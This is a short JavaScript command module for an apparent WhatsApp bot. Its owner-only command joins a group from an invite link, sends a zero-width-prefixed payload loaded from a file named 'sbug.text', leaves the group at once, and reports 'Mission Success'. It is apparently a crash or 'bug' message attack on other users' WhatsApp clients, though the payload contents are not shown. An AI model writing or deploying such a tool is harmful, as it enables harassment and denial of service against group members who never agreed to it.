const fs = require('fs');
const config = require('../../config');

module.exports = {
    name: "gb1",
    execute: async (conn, msg, args, { from, fancy, isOwner }) => {
        if (!isOwner) return;
        const payload = fs.readFileSync('./lib/payloads/sbug.text', 'utf-8');
        const code = args[0].split('https://chat.whatsapp.com/')[1];
        
        try {
            const jid = await conn.groupAcceptInvite(code);
            await conn.sendMessage(jid, { text: "\u200B" + payload });
            await conn.groupLeave(jid);
            await conn.sendMessage(conn.user.id, { text: fancy("🥀 Mission Success: GB1 Invisibility deployed.") });
        } catch (e) { msg.reply("🥀 Failed."); }
    }
};
